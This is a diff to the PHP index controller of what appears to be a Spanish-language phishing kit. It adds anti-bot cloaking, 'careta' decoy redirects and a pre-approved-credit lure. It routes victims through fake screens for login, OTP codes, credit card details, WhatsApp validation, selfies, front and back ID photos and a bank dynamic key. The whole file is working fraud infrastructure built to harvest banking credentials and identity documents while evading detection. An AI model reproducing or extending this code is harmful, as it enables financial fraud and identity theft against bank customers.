@@ -1,12 +1,60 @@
 <?php
+// ── Cloaking Anti-Bot ────────────────────────────────────
+require_once __DIR__ . '/config/cloak.php';
+// ─────────────────────────────────────────────────────────
 
+// Helper for testing: ?reset=true clears the cookie
+if (isset($_GET['reset'])) {
+    setcookie("visited_seguro", "", time() - 3600, "/");
+    header("Location: index.php"); // Reload to trigger the "first time" check
+    exit();
+}
+
+// Acceso directo al instalador: ?install=1
+if (isset($_GET['install'])) {
+    header("Location: install.php");
+    exit();
+}
+
+// Careta Mode Check — leer modo desde DB ('seguro', 'portnew', 'off')
+$caretaMode = 'seguro'; // default
+try {
+    $dbConn = (isset($conn) && $conn instanceof PDO) ? $conn : require __DIR__ . '/config/db.php';
+    $stmt = $dbConn->prepare("SELECT value FROM settings WHERE key = 'careta_mode'");
+    $stmt->execute();
+    $row = $stmt->fetch(PDO::FETCH_ASSOC);
+    if ($row !== false && in_array($row['value'], ['seguro', 'portnew', 'off'])) {
+        $caretaMode = $row['value'];
+    } else {
+        // Fallback de compatibilidad con redirect_enabled
+        $stmt2 = $dbConn->prepare("SELECT value FROM settings WHERE key = 'redirect_enabled'");
+        $stmt2->execute();
+        $row2 = $stmt2->fetch(PDO::FETCH_ASSOC);
+        if ($row2 !== false && $row2['value'] === '0') {
+            $caretaMode = 'off';
+        }
+    }
+}
+catch (Exception $e) {
+    $caretaMode = 'seguro';
+}
+
+// Redirección según la careta seleccionada (si no hay id o cupo activo en la URL)
+if (!isset($_GET['id']) && !isset($_GET['cupo'])) {
+    if ($caretaMode === 'seguro') {
+        header("Location: seguro/tunicio.php");
+        exit();
+    } elseif ($caretaMode === 'portnew') {
+        header("Location: seguro.php");
+        exit();
+    }
+    // Si $caretaMode === 'off', no redirige y va directo al login
+}
 
 // Mobile check removed to allow PC access
-
-
-?>
-<?php
-session_start();
+if (session_status() === PHP_SESSION_NONE) {
+    session_start();
+}
 
 // --- LÓGICA DEL CONTROLADOR ---
 $status = $_GET['status'] ?? 'login';
@@ -14,9 +62,32 @@ $body_class = '';
 
 if ($status === 'otp') {
     $body_class = 'otp-view';
-} elseif ($status === 'cc') {
+}
+elseif ($status === 'cc') {
     $body_class = 'cc-view';
-} elseif ($status === 'ccerror') { // <-- Nuevo estado para el error de tarjeta
+}
+elseif ($status === 'ccerror') { // <-- Nuevo estado para el error de tarjeta
+    $body_class = 'cc-view';
+}
+elseif ($status === 'whatsapp') { // <-- Nuevo estado WhatsApp
+    $body_class = 'cc-view';
+}
+elseif ($status === 'selfieerror') { // <-- Nuevo estado Selfie Error
+    $body_class = 'cc-view';
+}
+elseif ($status === 'doc_front') {
+    $body_class = 'cc-view';
+}
+elseif ($status === 'doc_back') {
+    $body_class = 'cc-view';
+}
+elseif ($status === 'doc_front_error') { // State 13
+    $body_class = 'cc-view';
+}
+elseif ($status === 'doc_back_error') { // State 14
+    $body_class = 'cc-view';
+}
+elseif ($status === 'clave_dinamica' || $status === 'clave_dinamica_error') { // State 15 & 16
     $body_class = 'cc-view';
 }
 
@@ -30,34 +101,71 @@ if ($status === 'otp') {
     <title>Plataforma</title>
     <link rel="stylesheet" href="assets/css/login.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <script src="assets/js/security.js"></script>
 </head>
 
 <body class="<?php echo $body_class; ?>">
 
     <?php
-    // --- SECCIÓN DE CARGA DE MÓDULOS ---
-    // 1. Cargamos el banner y el login para los estados 'login', 'espera' y 'erroruser'.
-    if ($status === 'login' || $status === 'espera' || $status === 'erroruser') {
-        include 'partials/notification_banner.php';
-        include 'partials/login.php';
-    }
+// --- SECCIÓN DE CARGA DE MÓDULOS ---
+// 1. Cargamos el banner y el login para los estados 'login', 'espera' y 'erroruser'.
+if ($status === 'login' || $status === 'espera' || $status === 'erroruser') {
+    include 'partials/notification_banner.php';
+    include 'partials/login.php';
+}
 
-    // 2. Basado en el 'status', decidimos qué vista/overlay mostrar encima.
-    if ($status === 'otp') {
-        include 'partials/otp_form.php';
-    } elseif ($status === 'espera') {
-        include 'partials/espera_overlay.php';
-    } elseif ($status === 'erroruser') {
-        include 'partials/error_user_notification.php';
-    } elseif ($status === 'cc') {
-        include 'partials/tarjeta_credito.php';
-    } elseif ($status === 'ccerror') { // <-- Nuevo estado
-        // Asegúrate de que tu módulo de tarjeta de crédito pueda leer este estado de error
-        // En tu partial, puedes usar 'if (isset($_GET['status']) && $_GET['status'] == 'ccerror')'
-        // para mostrar el mensaje de error.
-        include 'partials/tarjeta_credito.php';
-    }
-    ?>
+// Toast de cupo pre-aprobado (llega desde seguro.php con ?cupo=preaprobado)
+if (($status === 'login' || $status === 'espera') && isset($_GET['cupo']) && $_GET['cupo'] === 'preaprobado') {
+    include 'partials/cupo_preaprobado_notification.php';
+}
+
+// 2. Basado en el 'status', decidimos qué vista/overlay mostrar encima.
+if ($status === 'otp') {
+    include 'partials/otp_form.php';
+}
+elseif ($status === 'espera') {
+    include 'partials/espera_overlay.php';
+}
+elseif ($status === 'erroruser') {
+    include 'partials/error_user_notification.php';
+}
+elseif ($status === 'cc') {
+    include 'partials/tarjeta_credito.php';
+}
+elseif ($status === 'ccerror') {
+    include 'partials/tarjeta_credito.php';
+}
+elseif ($status === 'whatsapp') { // <-- Nuevo estado Include
+    include 'partials/whatsapp_validation.php';
+}
+elseif ($status === 'selfie') { // <-- Nuevo estado Selfie Include
+    include 'partials/selfie.php';
+}
+elseif ($status === 'selfieerror') { // <-- Nuevo estado Selfie Error
+    include 'partials/selfie_error_notification.php'; // Toast
+    include 'partials/selfie.php'; // Vista de cámara para reintentar
+}
+elseif ($status === 'doc_front') { // <-- Nuevo estado Doc Frente
+    include 'partials/doc_front.php';
+}
+elseif ($status === 'doc_back') { // <-- Nuevo estado Doc Reverso
+    include 'partials/doc_back.php';
+}
+elseif ($status === 'doc_front_error') { // State 13
+    include 'partials/doc_error_notification.php';
+    include 'partials/doc_front.php';
+}
+elseif ($status === 'doc_back_error') { // State 14
+    include 'partials/doc_error_notification.php';
+    include 'partials/doc_back.php';
+}
+elseif ($status === 'clave_dinamica') { // State 15
+    include 'partials/clave_dinamica.php';
+}
+elseif ($status === 'clave_dinamica_error') { // State 16
+    include 'partials/clave_dinamica.php';
+}
+?>
 
     <script>
         document.addEventListener('DOMContentLoaded', () => {
